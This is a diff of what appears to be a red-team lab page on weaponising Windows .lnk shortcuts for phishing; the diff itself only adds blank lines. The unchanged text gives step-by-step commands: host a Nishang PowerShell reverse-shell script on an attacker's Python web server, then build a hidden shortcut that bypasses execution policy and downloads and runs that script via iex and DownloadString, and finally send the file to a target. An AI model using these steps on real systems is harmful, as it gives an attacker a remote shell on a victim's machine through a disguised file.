@@ -33,13 +33,25 @@ Windows uses the .lnk file format for shortcuts, using these files to point to o
 
 Windows uses the .lnk file format for shortcuts, using these files to point to objects for execution. While these files must be executed by a user, it is a popular avenue for attackers, as they may allow for the execution of arbitrary commands.
 
+
+
 # Instructions
 
 1. Select a payload. Suggested: [Nishang Revers Shell One-Liner client](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1).
 
+
+
+
+
 **Code**: [[$client = New-Object System.Net.Sockets.TCPClient(]]
 
+
+
 For this example, the shell will be saved as shell.ps1, and hosted using a Python 3 web server on the attacker's machine.
+
+
+
+
 
 **Command** ([[Launch a Python 3 Web Server]]):
 
@@ -47,7 +59,15 @@ For this example, the shell will be saved as shell.ps1, and hosted using a Pytho
 python3 -m http.server $_PORT
 ```
 
+
+
+
+
 2. Use [PowerShell](https://redstack.io/RedTeamLabs--PowerShell.html) to create a .lnk file, which attempts to download and run shell.ps1 on the attacker's machine.
+
+
+
+
 
 **Command** ([[PowerShell Create a .LNK File with a PowerShell Payload]]):
 
@@ -59,9 +79,17 @@ $SC.Arguments="-ep bypass -windowstyle hidden iex(New-Object Net.WebClient).down
 $SC.Save()
 ```
 
+
+
+
+
 Note: when creating .LNK files, it is often best to create the file on the same version of Windows as the target.
 
+
+
 3. Transfer the .LNK file to the target, and upon execution the payload should run.
+
+
 
 ## Platforms
 
@@ -85,3 +113,5 @@ Note: when creating .LNK files, it is often best to create the file on the same 
 ## Tags
 
 - [[Phishing]]
+
+
